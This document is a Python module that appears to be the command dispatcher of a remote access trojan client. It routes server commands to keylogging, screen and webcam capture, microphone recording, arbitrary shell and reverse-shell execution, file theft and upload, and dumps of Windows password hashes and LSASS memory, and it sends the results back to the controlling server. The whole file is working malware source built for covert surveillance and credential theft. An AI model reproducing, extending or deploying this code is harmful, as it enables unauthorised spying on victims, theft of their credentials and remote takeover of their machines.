"""
Command Handler - Handle server commands
Coordinates all features and executes commands
"""

from datetime import datetime
from pathlib import Path
import tempfile, base64, zipfile, sys, subprocess

class CommandHandler:
    """Handle commands received from server"""
    
    def __init__(self, client_app) -> None:
        """
        Initialize command handler
        Args:
            client_app: Reference to ClientApp instance
        """

        try:
            self.app = client_app
            
            # Map commands to handlers
            self.handlers = {
                'screenshot': self._handle_screenshot,
                'keylogger_start': self._handle_keylogger_start,
                'keylogger_stop': self._handle_keylogger_stop,
                'stream_start': self._handle_stream_start,
                'stream_stop': self._handle_stream_stop,
                'webcam_snapshot': self._handle_webcam_snapshot,
                'ipconfig': self._handle_ipconfig,
                'shell': self._handle_shell,
                'download': self._handle_download,
                'upload': self._handle_upload,
                'search': self._handle_search,
                'list_dir': self._handle_list_dir,
                'hashdump': self._handle_hashdump,
                'hashdump_lsass': self._handle_hashdump_lsass,
                'restart': self._handle_restart,
                'stop': self._handle_stop,
                'audio_record': self._handle_audio_record,
                'audio_start': self._handle_audio_start,
                'audio_stop': self._handle_audio_stop,
                'audio_device_info': self._handle_audio_device_info,
                'webcam_snapshot_start': self._handle_webcam_snapshot_start,
                'webcam_snapshot_stop': self._handle_webcam_snapshot_stop,
                'download_logs': self._handle_download_logs,
                'config_get': self._handle_config_get,
                'config_set': self._handle_config_set,
                'config_profile': self._handle_config_profile,
                'reverse_shell_start': self._handle_reverse_shell_start,
                'reverse_shell_stop': self._handle_reverse_shell_stop,
                'reverse_shell_cmd': self._handle_reverse_shell_cmd,
            }
        except Exception as e:
            raise Exception("CommandHandler Initialization Error in __init__ function - " + str(e), "error")
    
    def handle(self, command, **kwargs) -> dict:
        """
        Handle a command from server
        Args:
            command: Command name
            **kwargs: Command parameters
        Returns:
            dict: Command execution result
        """
        # Uncomment for debugging

        
        try:
            # print(f"[DEBUG] CommandHandler.handle() called with command='{command}'")
            # print(f"[DEBUG] kwargs: {kwargs}")
            
            # Get handler from dict
            handler = self.handlers.get(command)
            
            if handler:
                # print(f"[DEBUG] Handler found: {handler.__name__}")
                
                # Call handler
                result = handler(**kwargs)
                
                # print(f"[DEBUG] Handler returned: {type(result)}")
                # print(f"[DEBUG] Result content: {result}")
                
                return result
            else:
                # print(f"[DEBUG] No handler found for command: {command}")
                # print(f"[DEBUG] Available handlers: {list(self.handlers.keys())}")
                
                return {
                    'success': False,
                    'error': f'Unknown command: {command}'
                }
        
        except Exception as e:
            # print(f"[!] Exception in CommandHandler.handle(): {e}")
            import traceback
            traceback.print_exc()
            
            return {
                'success': False,
                'error': str(e),
                'command': command
            }
        
    # ==================== CONFIGURATION ====================

    def _handle_config_get(self, **kwargs) -> dict:
        """Handle get config command"""
        
        try:
            config = self.app.config.get_config()
            
            return {
                'success': True,
                'type': 'config_result',
                'config': config
            }
        
        except Exception as e:
            return {
                'success': False,
                'type': 'config_result',
                'error': str(e)
            }

    def _handle_config_set(self, param=None, value=None, **kwargs) -> dict:
        """Handle set config command"""

        if not param or value is None:
            return {
                'success': False,
                'type': 'config_set_result',
                'error': 'Missing param or value'
            }
        
        try:
            success = self.app.config.set_config(param, value)
            
            if success:
                # Get new value for confirmation
                new_value = getattr(self.app.config, param)
                
                return {
                    'success': True,
                    'type': 'config_set_result',
                    'param': param,
                    'value': new_value,
                    'message': f'Parameter {param} set to {new_value}'
                }
            else:
                return {
                    'success': False,
                    'type': 'config_set_result',
                    'error': f'Invalid parameter: {param}'
                }
        
        except Exception as e:
            return {
                'success': False,
                'type': 'config_set_result',
                'error': str(e)
            }

    def _handle_config_profile(self, profile=None, **kwargs) -> dict:
        """Handle load profile command"""

        if not profile:
            return {
                'success': False,
                'type': 'config_profile_result',
                'error': 'No profile specified'
            }
        
        try:
            success = self.app.config.load_profile(profile)
            
            if success:
                # Get new config
                config = self.app.config.get_config()
                
                return {
                    'success': True,
                    'type': 'config_profile_result',
                    'profile': profile,
                    'config': config,
                    'message': f'Profile "{profile}" loaded successfully'
                }
            else:
                return {
                    'success': False,
                    'type': 'config_profile_result',
                    'error': f'Unknown profile: {profile}'
                }
        
        except Exception as e:
            return {
                'success': False,
                'type': 'config_profile_result',
                'error': str(e)
            }
    
    # ==================== REVERSE SHELL ====================

    def _handle_reverse_shell_start(self, **kwargs) -> dict:
        """Handle reverse shell start"""

        if hasattr(self.app, 'reverse_shell_instance') and self.app.reverse_shell_instance:
            if self.app.reverse_shell_instance.is_running():
                return {
                    'success': False,
                    'error': 'Reverse shell already running'
                }
        
        try:
            if sys.platform.startswith('win'):
                from __app__.client_app.features.reverseShell.main import ReverseShellWindows
                shell_class = ReverseShellWindows
            else:
                from __app__.client_app.features.reverseShell.main import ReverseShell
                shell_class = ReverseShell
            
            # Create shell with callback
            self.app.reverse_shell_instance = shell_class(
                callback=self._send_shell_output
            )
            
            # Start shell
            success = self.app.reverse_shell_instance.start()
            
            if success:
                return {
                    'success': True,
                    'message': 'Reverse shell started'
                }
            else:
                return {
                    'success': False,
                    'error': 'Failed to start shell'
                }
        
        except Exception as e:
            import traceback
            traceback.print_exc()
            
            return {
                'success': False,
                'error': str(e)
            }
    
    def _handle_reverse_shell_stop(self, **kwargs) -> dict:
        """Handle reverse shell stop"""

        if hasattr(self.app, 'reverse_shell_instance') and self.app.reverse_shell_instance:
            try:
                self.app.reverse_shell_instance.stop()
                self.app.reverse_shell_instance = None
                
                return {
                    'success': True,
                    'message': 'Reverse shell stopped'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {
            'success': False,
            'error': 'No reverse shell running'
        }

    def _handle_reverse_shell_cmd(self, command=None, **kwargs) -> dict:
        """Handle reverse shell command execution"""

        if not hasattr(self.app, 'reverse_shell_instance') or not self.app.reverse_shell_instance:
            return {
                'success': False,
                'type': 'reverse_shell_output',
                'output': '[!] No reverse shell active. Use "reverse_shell start" first.\n'
            }
        
        if not command:
            return {
                'success': False,
                'type': 'reverse_shell_output',
                'output': '[!] No command provided\n'
            }
        
        try:
            # Execute command in shell
            self.app.reverse_shell_instance.execute(command)
            
            # Output will be sent via callback
            return None  # No immediate response
        
        except Exception as e:
            return {
                'success': False,
                'type': 'reverse_shell_output',
                'output': f'[!] Error: {str(e)}\n'
            }

    def _send_shell_output(self, output) -> None:
        """
        Callback to send shell output to server
        Args:
            output: Shell output text
        """

        if self.app.socket_client and self.app.socket_client.is_connected():
            self.app.socket_client.send({
                'type': 'reverse_shell_output',
                'output': output
            })

    # =================== AUDIO RECORDING ==================

    def _handle_audio_record(self, duration=10, **kwargs) -> dict:
        """Handle audio record command (single recording)"""
        # Uncomment for debugging

        # print("[DEBUG] _handle_audio_record() called")
        # print(f"[DEBUG] duration parameter: {duration}")
        
        try:
            from __app__.client_app.features.audioRecorder.main import AudioRecorder
            from datetime import datetime
            
            # print("[DEBUG] Imports successful")
            
            # Parse duration
            duration = int(duration) if duration else 10
            # print(f"[DEBUG] Parsed duration: {duration}")
            
            # Create recorder
            # print("[DEBUG] Creating AudioRecorder...")
            recorder = AudioRecorder(
                output_dir="logs/audio",
                duration=duration
            )
            # print("[DEBUG] AudioRecorder created")
            
            # Record
            # print(f"[DEBUG] Starting recording for {duration} seconds...")
            filepath = recorder.record_now()
            # print(f"[DEBUG] Recording complete: {filepath}")
            
            # Prepare result
            result = {
                'success': True,
                'type': 'audio_record_result',
                'filepath': str(filepath),
                'duration': duration,
                'timestamp': datetime.now().isoformat()
            }
            
            # print(f"[DEBUG] Prepared result: {result}")
            
            return result
        
        except Exception as e:
            # print(f"[!] Exception in _handle_audio_record: {e}")
            import traceback
            traceback.print_exc()
            
            result = {
                'success': False,
                'type': 'audio_record_result',
                'error': str(e),
                'timestamp': datetime.now().isoformat() if 'datetime' in dir() else 'unknown'
            }
            
            # print(f"[DEBUG] Error result: {result}")
            
            return result

    def _handle_audio_start(self, duration=10, interval=60, **kwargs) -> dict:
        """Handle audio start command (continuous recording)"""

        if not hasattr(self.app, 'audio_instance') or not self.app.audio_instance:
            import threading
            from __app__.client_app.features.audioRecorder.main import AudioRecorder
            
            try:
                duration = int(duration) if duration else 10
                interval = int(interval) if interval else 60
                
                self.app.audio_instance = AudioRecorder(
                    output_dir="logs/audio",
                    duration=duration
                )
                
                self.app.audio_thread = threading.Thread(
                    target=lambda: self.app.audio_instance.start(
                        continuous=True,
                        interval=interval
                    ),
                    daemon=True
                )
                self.app.audio_thread.start()
                
                # Return response (no 'type' = not sent to server, OK pour start/stop)
                return {
                    'success': True,
                    'message': f'Audio recording started (duration: {duration}s, interval: {interval}s)'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {'success': False, 'error': 'Audio recording already running'}

    def _handle_audio_stop(self, **kwargs) -> dict:
        """Handle audio stop command"""

        if hasattr(self.app, 'audio_instance') and self.app.audio_instance:
            try:
                self.app.audio_instance.stop()
                self.app.audio_instance = None
                
                return {
                    'success': True,
                    'message': 'Audio recording stopped'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {'success': False, 'error': 'Audio recording not running'}

    def _handle_audio_device_info(self, **kwargs) -> dict:
        """Handle audio device info command"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorder
        
        try:
            recorder = AudioRecorder()
            device_info = recorder.get_device_info()
            
            # Return with 'type' to send to server
            return {
                'success': device_info['success'],
                'type': 'audio_device_info',
                'devices': device_info.get('devices', []),
                'default_device': device_info.get('default_device'),
                'error': device_info.get('error')
            }
        
        except Exception as e:
            return {
                'success': False,
                'type': 'audio_device_info',
                'error': str(e)
            }
    
    # ==================== SCREENSHOT ====================
    
    def _handle_screenshot(self, **kwargs) -> dict:
        """Handle screenshot command"""

        if self.app.screenshot_instance:
            filepath = self.app.screenshot_instance.capture_now()
            return {
                'success': True,
                'type': 'screenshot_result',
                'filepath': str(filepath),
                'timestamp': datetime.now().isoformat()
            }
        return {'success': False, 'error': 'Screenshot not available'}
    
    # ==================== KEYLOGGER ====================
    
    def _handle_keylogger_start(self, **kwargs) -> dict:
        """Handle keylogger start command"""

        if not self.app.keylogger_instance:
            import threading
            self.app.keylogger_thread = threading.Thread(
                target=self.app._keylogger,
                daemon=True
            )
            self.app.keylogger_thread.start()
            return {'success': True, 'message': 'Keylogger started'}
        return {'success': False, 'error': 'Keylogger already running'}
    
    def _handle_keylogger_stop(self, **kwargs) -> dict:
        """Handle keylogger stop command"""

        if self.app.keylogger_instance:
            self.app.keylogger_instance.stop()
            self.app.keylogger_instance = None
            return {'success': True, 'message': 'Keylogger stopped'}
        return {'success': False, 'error': 'Keylogger not running'}
    
    # ==================== WEBCAM STREAM ====================
    
    def _handle_stream_start(self, **kwargs) -> dict:
        """Handle stream start command"""

        if not self.app.webcam_stream_instance:
            import threading
            self.app.webcam_stream_thread = threading.Thread(
                target=self.app._webcam_stream,
                daemon=True
            )
            self.app.webcam_stream_thread.start()
            return {'success': True, 'message': 'Stream started'}
        return {'success': False, 'error': 'Stream already running'}
    
    def _handle_stream_stop(self, **kwargs) -> dict:
        """Handle stream stop command"""

        if self.app.webcam_stream_instance:
            self.app.webcam_stream_instance.stop()
            self.app.webcam_stream_instance = None
            return {'success': True, 'message': 'Stream stopped'}
        return {'success': False, 'error': 'Stream not running'}
    
    def _handle_webcam_snapshot_start(self, interval=30, **kwargs) -> dict:
        """Handle webcam snapshot start command"""

        if not self.app.webcam_snapshot_instance:
            import threading
            
            try:
                interval = int(interval) if interval else 30
                
                self.app.webcam_snapshot_thread = threading.Thread(
                    target=self.app._webcam_snapshot,
                    daemon=True
                )
                self.app.webcam_snapshot_thread.start()
                
                return {
                    'success': True,
                    'message': f'Webcam snapshot started (interval: {interval}s)'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {'success': False, 'error': 'Webcam snapshot already running'}

    def _handle_webcam_snapshot_stop(self, **kwargs) -> dict:
        """Handle webcam snapshot stop command"""

        if self.app.webcam_snapshot_instance:
            try:
                self.app.webcam_snapshot_instance.stop()
                self.app.webcam_snapshot_instance = None
                
                return {
                    'success': True,
                    'message': 'Webcam snapshot stopped'
                }
            
            except Exception as e:
                return {
                    'success': False,
                    'error': str(e)
                }
        
        return {'success': False, 'error': 'Webcam snapshot not running'}
        
    # ==================== WEBCAM SNAPSHOT ====================
    
    def _handle_webcam_snapshot(self, **kwargs) -> dict:
        """Handle webcam snapshot command"""

        if self.app.webcam_snapshot_instance:
            filepath = self.app.webcam_snapshot_instance.capture_now()
            return {
                'success': True,
                'filepath': str(filepath),
                'timestamp': datetime.now().isoformat()
            }
        return {'success': False, 'error': 'Webcam not available'}
    
    # ==================== NETWORK ====================
    
    def _handle_ipconfig(self, **kwargs) -> dict:
        """Handle ipconfig command"""

        if self.app.network_instance:
            network_info = self.app.network_instance.get_current_info()
            return {
                'success': True,
                'type': 'network_info',
                'data': network_info
            }
        return {'success': False, 'error': 'Network info not available'}
    
    # ==================== SHELL ====================
    
    def _handle_shell(self, shell_cmd=None, **kwargs) -> dict:
        """Handle shell command"""

        if not shell_cmd:
            return {'success': False, 'error': 'No command provided'}
        
        from __app__.client_app.features.shell.main import ShellExecutor
        
        executor = ShellExecutor(timeout=30)
        result = executor.execute(shell_cmd)
        
        return {
            'success': result['success'],
            'type': 'shell_result',
            'command': result['command'],
            'output': result.get('output', ''),
            'error': result.get('error', ''),
            'return_code': result.get('return_code', -1)
        }
    
    # ==================== FILE OPERATIONS ====================
    
    def _handle_download(self, filepath=None, **kwargs) -> dict:
        """Handle download command"""

        if not filepath:
            return {'success': False, 'error': 'No filepath provided'}
        
        from __app__.client_app.features.fileManager.main import FileManager
        
        manager = FileManager()
        result = manager.download(filepath)
        
        if result['success']:
            return {
                'success': True,
                'type': 'file_data',
                'filename': result['filename'],
                'data': result['data'],
                'size': result['size']
            }
        else:
            return result
    
    def _handle_upload(self, filepath=None, data=None, **kwargs) -> dict:
        """Handle upload command"""

        if not filepath or not data:
            return {'success': False, 'error': 'Missing filepath or data'}
        
        from __app__.client_app.features.fileManager.main import FileManager
        
        manager = FileManager()
        result = manager.upload(filepath, data)
        
        return {
            'success': result['success'],
            'type': 'upload_result',
            'filepath': result.get('filepath'),
            'error': result.get('error')
        }
    
    def _handle_search(self, pattern=None, **kwargs) -> dict:
        """Handle search command"""

        if not pattern:
            return {'success': False, 'error': 'No search pattern provided'}
        
        from __app__.client_app.features.fileManager.main import FileManager
        
        manager = FileManager(max_search_results=100)
        result = manager.search(pattern)
        
        return {
            'success': result['success'],
            'type': 'search_result',
            'pattern': result.get('pattern'),
            'results': result.get('results', []),
            'count': result.get('count', 0)
        }
    
    def _handle_list_dir(self, dirpath=None, **kwargs) -> dict:
        """Handle list directory command"""

        if not dirpath:
            return {'success': False, 'error': 'No directory path provided'}
        
        from __app__.client_app.features.fileManager.main import FileManager
        
        manager = FileManager()
        result = manager.list_directory(dirpath)
        
        return {
            'success': result['success'],
            'type': 'directory_listing',
            'directory': result.get('directory'),
            'contents': result.get('contents', []),
            'count': result.get('count', 0)
        }
    
    # ==================== LOG DOWNLOAD ====================
    
    def _handle_download_logs(self, **kwargs) -> dict:
        """Handle download logs command - zip all logs"""
        
        try:
            logs_dir = Path("logs")
            
            if not logs_dir.exists():
                return {
                    'success': False,
                    'error': 'Logs directory not found'
                }
            
            # Create temporary zip file
            temp_zip = Path(tempfile.gettempdir()) / f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
            
            # Zip all logs
            with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in logs_dir.rglob('*'):
                    if file.is_file():
                        arcname = file.relative_to(logs_dir.parent)
                        zipf.write(file, arcname)
            
            # Read and encode
            with open(temp_zip, 'rb') as f:
                zip_data = base64.b64encode(f.read()).decode('utf-8')
            
            zip_size = temp_zip.stat().st_size
            
            # Cleanup
            temp_zip.unlink()
            
            return {
                'success': True,
                'type': 'logs_archive',
                'filename': temp_zip.name,
                'data': zip_data,
                'size': zip_size,
                'timestamp': datetime.now().isoformat()
            }
        
        except Exception as e:
            return {
                'success': False,
                'type': 'logs_archive',
                'error': str(e)
            }
    
    # ==================== HASHDUMP ====================
    
    def _handle_hashdump(self, **kwargs) -> dict:
        """Handle hashdump command"""

        from __app__.client_app.features.hashDump.main import HashDump
        
        dumper = HashDump()
        result = dumper.dump_hashes()
        
        return {
            'success': result['success'],
            'type': 'hashdump_result',
            'hashes': result.get('hashes', {}),
            'error': result.get('error'),
            'timestamp': result.get('timestamp')
        }
    
    def _handle_hashdump_lsass(self, **kwargs) -> dict:
        """Handle LSASS dump command"""

        from __app__.client_app.features.hashDump.main import HashDump
        
        dumper = HashDump()
        result = dumper.dump_lsass()
        
        return {
            'success': result['success'],
            'type': 'hashdump_lsass_result',
            'dump_file': result.get('dump_file'),
            'size': result.get('size'),
            'note': result.get('note'),
            'error': result.get('error')
        }
    
    # ==================== SYSTEM CONTROL ====================
    
    def _handle_restart(self, **kwargs) -> dict:
        """Handle restart command"""
        
        try:
            python = sys.executable
            script = sys.argv[0]
            subprocess.Popen([python, script] + sys.argv[1:])
            sys.exit(0)
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _handle_stop(self, **kwargs) -> dict:
        """Handle stop command"""

        self.app.__stop__()
        sys.exit(0)